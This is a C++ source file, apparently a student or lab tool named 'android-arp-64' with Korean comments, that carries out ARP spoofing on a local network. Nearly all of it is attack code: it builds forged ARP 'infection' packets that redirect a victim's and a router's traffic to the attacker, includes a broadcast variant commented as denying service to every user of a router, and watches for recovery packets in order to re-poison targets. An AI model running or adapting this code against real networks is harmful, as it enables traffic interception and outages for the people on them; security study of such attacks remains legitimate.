#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <stdexcept>
#include <iostream>
#include <vector>
#include <cstring>
#include "utill.h"

#define MAC_ALEN 6
#define MAC_ADDR_LEN 6


void usage()
{
        std::cout << "broadcast: ./android-arp-64 [interface name] [target ip]\n";
        std::cout << "unicast: ./android-arp-64 [interface name] [sender ip] [target ip]\n";
}

struct SocketGuard {
    int fd;
    SocketGuard() {
        fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) throw std::runtime_error("Socket creation failed");
    }
    ~SocketGuard() {if (fd >= 0) close (fd);}
    operator int() const {return fd;}
};

Ip getMyIp(std::string_view interfaceName) {
    SocketGuard sock;
    struct ifreq ifr;
    if (interfaceName.length() >= IFNAMSIZ) {
        throw std::invalid_argument("Interface name too long");
    }
    std::memset(&ifr, 0, sizeof(ifr));
    std::memcpy(ifr.ifr_name, interfaceName.data(), interfaceName.length()); // strncpy는 다르게 마지막에 널문자를 확실하게 붙여주기위한 memset->memcpy
    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        throw std::runtime_error("Failed to get IP address for " + std::string(interfaceName));
    }
    return Ip(ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));
}

bool sendPacket(pcap_t *handle, const u_char *packet, size_t packetSize) {
    int res = pcap_sendpacket(handle, packet, packetSize);
    if (res != 0) {
        std::cerr << "pcap_sendpacket error return " << res << " : " << pcap_geterr(handle) << std::endl;
        return false;
    }
    return true;
}


Mac get_mac(pcap_t *handle, const u_char *packet, size_t packetSize, Ip target_ip){
    // ARP request 전송
    // ARP를 전송하면 대상은 mac주소를 반환하게 되어있음
    if (!sendPacket(handle, packet, packetSize)){
        return Mac::nullMac();
    }

    // 응답을 대기, 기존의 pcap_loop는 패킷을 받는 즉시 mac주소를 얻을 수 있는 상황일 경우만 유효
    constexpr int MAX_TRY = 50;
    int try_cnt = 0;
    while (try_cnt++ < MAX_TRY) {
        struct pcap_pkthdr* header;
        const u_char* pkt_data;
        int res = pcap_next_ex(handle, &header, &pkt_data);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        struct EthHdr *eh = (struct EthHdr*)pkt_data;
        if (eh->type() != EthHdr::Arp) continue;
        struct ArpHdr *ah = (struct ArpHdr*)((u_char*)eh + sizeof(EthHdr));
        if (ah->op() == ArpHdr::Reply && ah->sip_ == target_ip) {
            return ah->smac_;
        }
    }
    return Mac::nullMac();
}

// 감염 패킷 생성(ARP Reply사용)
EthArpPacket Make_Infection_Packet(Mac attacker_mac, Mac sender_mac, Ip sender_ip, Ip target_ip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = attacker_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;

    packet.arp_.op_ = htons(ArpHdr::Reply);

    packet.arp_.smac_ = attacker_mac;       // 공격자(나)의 Mac
    packet.arp_.sip_ = htonl(target_ip); // 속일 IP (여기서는 라우터)
    packet.arp_.tmac_ = sender_mac;         // 받는 사람 Mac
    packet.arp_.tip_  = htonl(sender_ip);          // 받는 사람 Ip

    return packet;
}

// 탐색(Mac Resolution)용 패킷 생성
EthArpPacket Make_Normal_Packet(Mac attacker_mac, Ip attacker_ip, Ip target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_   = Mac::broadcastMac();
    packet.eth_.smac_   = attacker_mac;
    packet.eth_.type_   = htons(EthHdr::Arp);

    packet.arp_.hrd_    = htons(ArpHdr::ETHER);
    packet.arp_.pro_    = htons(EthHdr::Ip4);
    packet.arp_.hln_    = Mac::SIZE;
    packet.arp_.pln_    = Ip::SIZE;
    packet.arp_.op_     = htons(ArpHdr::Request);

    packet.arp_.smac_   = attacker_mac;
    packet.arp_.sip_    = htonl(attacker_ip);
    packet.arp_.tmac_   = Mac::nullMac();
    packet.arp_.tip_    = htonl(target_ip);

    return packet;
}

// 상대방(엣지 디바이스) 감염
EthArpPacket Sender_Infection(char *interfaceName, Mac my_mac, Mac SenderMac, Ip sip, Ip tip)
{
    return Make_packet(interfaceName, SenderMac, my_mac, my_mac, tip, SenderMac, sip);;
}

// 라우터(공유기) 감염
EthArpPacket Target_Infection(char *interfaceName, Mac my_mac, Mac Target_Mac, Ip sip, Ip tip)
{
    EthArpPacket packet;
    packet = Make_packet(interfaceName, Target_Mac, my_mac, my_mac, sip, Target_Mac, tip);
    return packet;
}

// Dos를 위한 감염
EthArpPacket One_Infection(char *interfaceName, Mac my_mac, Mac Sender_Mac, Ip sip, Ip tip)
{
    EthArpPacket packet;
    packet = Make_packet(interfaceName, Sender_Mac, my_mac, my_mac, tip, Sender_Mac, sip);
    return packet;
}

// 특정 라우터를 감염시켜 연결된 모든 사용자 Dos
EthArpPacket Broadcast_Infection(char *interfaceName, Mac my_mac, Ip tip)
{
    EthArpPacket packet;
    packet = Make_packet(interfaceName, Mac::broadcastMac(), my_mac, Mac::randomMac(), tip, Mac::nullMac(), tip);
    return packet;
}

// 정상적인 패킷 생성
EthArpPacket normal_packet(char *interfaceName, Mac my_mac, Ip sip, Ip my_ip)
{
    EthArpPacket packet;
    packet = Make_packet(interfaceName, Mac::broadcastMac(), my_mac, my_mac, my_ip, Mac::nullMac(), sip);
    return packet;
}

// 중복되는 패킷만들기를 따로 메서드로 분리
EthArpPacket Make_packet(char *interfaceName,
                         Mac eth_dmac,
                         Mac eth_smac,
                         Mac arp_smac,
                         Ip arp_sip,
                         Mac arp_tmac,
                         Ip arp_tip)
{

    EthArpPacket packet;


    packet.eth_.dmac_ = eth_dmac; // Sender MAC
    packet.eth_.smac_ = eth_smac; // 내 MAC
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);

    packet.arp_.smac_ = arp_smac;      // 내 MAC
    packet.arp_.sip_ = htonl(arp_sip); // gateway ip , Input
    packet.arp_.tmac_ = arp_tmac;      // sender MAC
    packet.arp_.tip_ = htonl(arp_tip); // sender IP

    return packet;
}

// 상대방이 지속적으로 날리는 arp패킷(브로드캐스트로 라우터에게 발송하는 패킷이며 라우터에 수신될 경우 감염이 풀리므로 재감염 필요)을 감지
bool checkRecoverPacket(EthArpPacket &packet, Ip SenderIP, Ip TargetIp, Mac TargetMac, Mac SenderMac)
{
    if (packet.eth_.type() == EthHdr::Arp)
    {
        if (packet.arp_.op() == ArpHdr::Request || packet.arp_.op() == ArpHdr::Reply)
        {
            if (packet.arp_.sip_ == Ip(htonl(SenderIP)) || packet.arp_.sip_ == Ip(htonl(TargetIp)))
            {
                if (packet.arp_.tmac_ == TargetMac || packet.arp_.tmac_ == SenderMac || packet.arp_.tmac_ == Mac::nullMac())
                {
                    return true;
                }
            }
        }
    }
    return false;
}

// 만들어진 패킷을 보내는 용도
void SendInfectionPacket(pcap_t *handle, EthArpPacket packet)
{
        // EthArpPacket을 그냥 파라미터로 받아서 보내도록 하자..
        // ARP Spoofing 패킷 전송
        int res_sender = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
        if (res_sender != 0)
        {
           fprintf(stderr, "pcap_sendpacket (Sender) return %d error=%s\n", res_sender, pcap_geterr(handle));
        }
}